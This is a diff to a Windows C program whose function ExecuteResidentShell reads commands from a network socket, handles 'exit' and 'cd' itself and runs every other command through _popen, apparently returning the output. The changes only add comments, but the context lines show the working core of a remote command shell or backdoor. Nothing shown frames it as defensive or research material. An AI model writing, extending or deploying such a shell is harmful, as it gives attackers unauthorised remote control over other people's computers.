@@ -1,6 +1,6 @@
 #include <winsock2.h>
 #include <windows.h>
-#include <stdio.h> 
+#include <stdio.h> // Using C headers is much lighter than <string>
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -14,10 +14,13 @@ void ExecuteResidentShell(SOCKET s) {
 
         buffer[bytes] = '\0';
 
+        // Internal Command: Exit (using C-style strstr)
         if (strstr(buffer, "exit")) break;
 
+        // Internal Command: cd (Manual traversal logic)
         if (strncmp(buffer, "cd ", 3) == 0) {
             char* path = buffer + 3;
+            // Trim trailing whitespace/newlines
             for(int i = strlen(path)-1; i >= 0 && (path[i]=='\n'||path[i]=='\r'||path[i]==' '); i--) path[i]='\0';
             
             if (SetCurrentDirectoryA(path)) {
@@ -29,7 +32,7 @@ void ExecuteResidentShell(SOCKET s) {
             continue;
         }
 
-  
+        // Standard execution
         FILE* fp = _popen(buffer, "r");
         if (fp != NULL) {
             while (fgets(cmdResult, sizeof(cmdResult), fp) != NULL) {
